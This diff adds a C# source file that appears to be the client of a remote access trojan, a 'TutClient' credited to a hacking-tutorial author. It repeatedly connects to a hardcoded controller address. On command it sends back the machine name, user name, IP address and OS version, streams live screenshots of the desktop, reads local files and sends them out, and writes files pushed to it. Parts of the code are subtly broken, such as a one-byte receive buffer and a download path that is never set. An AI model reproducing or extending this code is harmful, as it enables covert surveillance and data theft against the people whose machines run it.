@@ -1,0 +1,390 @@
+using System;
+using System.Collections.Generic;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.Text;
+using System.Net;
+using System.Net.Sockets;
+using System.IO;
+using System.Runtime.InteropServices;
+using System.Threading;
+using System.Windows.Forms;
+namespace TutClient
+{
+    // Original Source https://github.com/AdvancedHacker101
+    // Edited By Bashar Bachir https://www.dev-point.com/vb/members/112121/
+    class RDesktop
+    {
+        public static bool IsShutdown;
+        private static readonly ImageConverter Convert = new ImageConverter();
+        private static byte[] _img;
+        public static void StreamScreen()
+        {
+            while (true)
+            {
+                if (IsShutdown)
+                {
+                    break;
+                }
+                try
+                {
+                    _img = (byte[])Convert.ConvertTo(Desktop(), typeof(byte[])); 
+                    if (_img != null)
+                        Program.SendScreen(_img);
+                    Array.Clear(_img ?? throw new InvalidOperationException(), 0, _img.Length);
+                    Thread.Sleep(Program.Fps);
+                }
+                catch
+                {
+                    IsShutdown = true;
+                    break;
+                }
+            }
+        }
+        private static Bitmap Desktop()
+        {
+            try
+            {
+                if (Program.ScreenNumber == 0)
+                {
+                    var bounds = Screen.PrimaryScreen.Bounds;
+                    var screenshot = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
+                    using (var graph = Graphics.FromImage(screenshot))
+                    {
+                        graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
+                    }
+                    GC.Collect();
+                    GC.WaitForPendingFinalizers();
+                    Thread.SpinWait(5000);
+                    return screenshot;
+                }
+                var bmpScreenshot = new Bitmap(Screen.AllScreens[Program.ScreenNumber].Bounds.Width, Screen.AllScreens[Program.ScreenNumber].Bounds.Height, PixelFormat.Format32bppArgb);
+                using (var graph = Graphics.FromImage(bmpScreenshot))
+                {
+                    graph.CopyFromScreen(Screen.AllScreens[Program.ScreenNumber].Bounds.X, Screen.AllScreens[1].Bounds.Y, 0, 0, Screen.AllScreens[Program.ScreenNumber].Bounds.Size, CopyPixelOperation.SourceCopy);
+                }
+
+                GC.Collect();
+                GC.WaitForPendingFinalizers();
+                Thread.SpinWait(5000);
+                return bmpScreenshot;
+            }
+            catch
+            {
+                var desktopHwnd = FindWindowEx(GetDesktopWindow(), IntPtr.Zero, "Progman", "Program Manager");
+                var rect = new Rectangle();
+                GetWindowRect(desktopHwnd, ref rect);
+                var bmp = new Bitmap(rect.Width, rect.Height);
+                var memoryGraphics = Graphics.FromImage(bmp);
+                var dc = memoryGraphics.GetHdc();
+                PrintWindow(desktopHwnd, dc, 0);
+                memoryGraphics.ReleaseHdc(dc);
+                GC.Collect();
+                GC.WaitForPendingFinalizers();
+                Thread.SpinWait(5000);
+                return bmp;
+            }
+        }
+        [DllImport("User32.dll", SetLastError = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        static extern bool PrintWindow(IntPtr hwnd, IntPtr hdc, uint nFlags);
+        [DllImport("user32.dll")]
+        static extern bool GetWindowRect(IntPtr handle, ref Rectangle rect);
+        [DllImport("user32.dll", EntryPoint = "GetDesktopWindow")]
+        static extern IntPtr GetDesktopWindow();
+        [DllImport("user32.dll", CharSet = CharSet.Unicode)]
+        static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string lclassName, string windowTitle);
+    }
+    class Program
+    {
+        public static int Fps = 100;
+        private static Socket _clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+       private const int Port = 100; // s
+        private static String fup_location = "";
+        private static int fup_size = 0;
+        private static bool _isFileDownload;
+        private static int _writeSize;
+        private static readonly byte[] RecvFile = new byte[1];
+        private static String fdl_location = "";
+        private static bool _isDisconnect;
+        public static int ScreenNumber;
+        static void Main()
+        {
+            ConnectToServer();
+            RequestLoop();
+        }
+        private static string ResolveDns(string input)
+        {
+            try
+            {
+                var ipAddr = Dns.GetHostAddresses(input)[0].ToString();
+                return ipAddr;
+            }
+            catch (Exception)
+            {
+                return null;
+            }
+        }
+        private static string GetIpAddress(string input)
+        {
+            if (input == "") return null;
+            var validIp = true;
+
+            if (input.Contains("."))
+            {
+                var parts = input.Split('.');
+                if (parts.Length == 4)
+                {
+                    foreach (var ipPart in parts)
+                    {
+                        foreach (char t in ipPart)
+                        {
+                            if (!char.IsNumber(t))
+                            {
+                                validIp = false;
+                                break;
+                            }
+                        }
+                        if (!validIp)
+                        {
+                            break;
+                        }
+                    }
+                    if (validIp)
+                    {
+                        return input;
+                    }
+                    return ResolveDns(input);
+                }
+                return ResolveDns(input);
+            }
+            return null;
+        }
+        private static void ConnectToServer()
+        {
+            while (!_clientSocket.Connected)
+            {
+                try
+                {
+                    var connectionString = GetIpAddress("192.168.2.100");
+                    _clientSocket.Connect(IPAddress.Parse(connectionString), Port);
+                    Thread.Sleep(500);
+                }
+                catch (SocketException)
+                {
+                    if (RDesktop.IsShutdown == false)
+                    {
+                        RDesktop.IsShutdown = true;
+                    }
+                }
+            }
+        }
+        // ReSharper disable once FunctionRecursiveOnAllPaths
+        private static void RequestLoop()
+        {
+
+            while (true)
+            {
+                if (_isDisconnect) break;
+                ReceiveResponse();
+            }
+            _clientSocket.Shutdown(SocketShutdown.Both);
+            _clientSocket.Close();
+            _clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
+            ConnectToServer();
+            _isDisconnect = false;
+            RequestLoop();
+        }
+        private static String[] GetCommands(string rawData)
+        {
+            var commands = new List<string>();
+            var readBack = 0;
+
+            for (var i = 0; i < rawData.Length; i++)
+            {
+                var current = rawData[i];
+                if (current == '§')
+                {
+                    var dataLength = int.Parse(rawData.Substring(readBack, i - readBack));
+                    var command = rawData.Substring(i + 1, dataLength);
+                    i = i + 1 + dataLength;
+                    readBack = i;
+                    commands.Add(command);
+                }
+            }
+            return commands.ToArray();
+        }
+        private static void HandleCommand(string text)
+        {
+          
+            if (text == "fpslow") 
+            {
+                Fps = 150;
+            }
+            if (text == "fpsbest")
+            {
+                Fps = 80;
+            }
+            if (text == "fpshigh")
+            {
+                Fps = 50;
+            }
+            if (text == "fpsmid")
+            {
+                Fps = 100;
+            }
+            if (text == "control.you")
+            {
+                SendCommand("OK! then");
+            }
+            if (text.StartsWith("getinfo-"))
+            {
+                var myid = int.Parse(text.Split('-')[1]);
+                var allInfo = Environment.MachineName + "|" + GetLocalIpAddress() + "|" +Environment.UserName + "|" + Environment.OSVersion;
+                var resp = "infoback;" + myid + ";" + allInfo;
+                SendCommand(resp);
+            }
+            
+            if (text == "fconfirm")
+            {
+                var sendFile = File.ReadAllBytes(fdl_location);
+                SendByte(sendFile);
+            }
+            if (text == "dc")
+            {
+                Thread.Sleep(3000);
+                _isDisconnect = true;
+            }
+            if (text == "rdstart")
+            {
+                var rd = new Thread(RDesktop.StreamScreen);
+                RDesktop.IsShutdown = false;
+                rd.Start();
+            }
+            if (text == "rdstop")
+            {
+                RDesktop.IsShutdown = true;
+            }    
+            if (text.StartsWith("screenNum"))
+            {
+                var screenNumbers = int.Parse(text.Replace("screenNum", "")) - 1;
+                ScreenNumber = screenNumbers;
+            }
+        }
+        private static void ReceiveResponse()
+        {
+            var buffer = new byte[2048];
+            try
+            {
+                var received = _clientSocket.Receive(buffer, SocketFlags.None);
+                if (received == 0) return;
+                var data = new byte[received];
+                Array.Copy(buffer, data, received);
+
+                if (_isFileDownload)
+                {
+                    Buffer.BlockCopy(data, 0, RecvFile, _writeSize, data.Length);
+                    _writeSize += data.Length;
+                    if (_writeSize == fup_size)
+                    {
+                        using (var fs = File.Create(fup_location))
+                        {
+                            var info = RecvFile;
+                            fs.Write(info, 0, info.Length);
+                        }
+                        Array.Clear(RecvFile, 0, RecvFile.Length);
+                        SendCommand("frecv");
+                        _writeSize = 0;
+                        _isFileDownload = false;
+                        return;
+                    }
+                }
+                if (!_isFileDownload)
+                {
+                    var text = Encoding.Unicode.GetString(data);
+                    var commands = GetCommands(text);
+                    foreach (var cmd in commands)
+                    {
+                        HandleCommand(cmd);
+                    }
+                }
+            }
+            catch (Exception)
+            {
+                RDesktop.IsShutdown = true;
+            }
+        }
+        public static void SendScreen(byte[] img)
+        {
+            try
+            {
+                var send = new byte[img.Length + 16];
+                var header = Encoding.Unicode.GetBytes("rdstream");
+                Buffer.BlockCopy(header, 0, send, 0, header.Length);
+                Buffer.BlockCopy(img, 0, send, header.Length, img.Length);
+                _clientSocket.Send(send, 0, send.Length, SocketFlags.None);
+            }
+            catch (Exception)
+            {
+                try
+                {
+                    Thread.Sleep(3000);
+                    _isDisconnect = true;
+                }
+                catch (Exception)
+                {
+
+                    Thread.Sleep(10000);
+                }
+            }
+        }
+        public static string GetLocalIpAddress()
+        {
+            var host = Dns.GetHostEntry(Dns.GetHostName());
+            foreach (var ip in host.AddressList)
+            {
+                if (ip.AddressFamily == AddressFamily.InterNetwork)
+                {
+                    return ip.ToString();
+                }
+            }
+            return "N/A";
+        }
+       
+        private static void SendCommand(String response, bool isCmd = false)
+        {
+            if (!_clientSocket.Connected)
+            {
+                return;
+            }
+            var k = response;
+            var crypted = k;
+            if (isCmd) crypted = k;
+            var data = Encoding.Unicode.GetBytes(crypted);
+            try
+            {
+                _clientSocket.Send(data);
+            }
+            catch
+            {
+                // ignored
+            }
+        }
+        private static void SendByte(byte[] data)
+        {
+            if (!_clientSocket.Connected)
+            {
+                return;
+            }
+            try
+            {
+                _clientSocket.Send(data);
+            }
+            catch
+            {
+                // ignored
+            }
+        }
+    }
+
+}
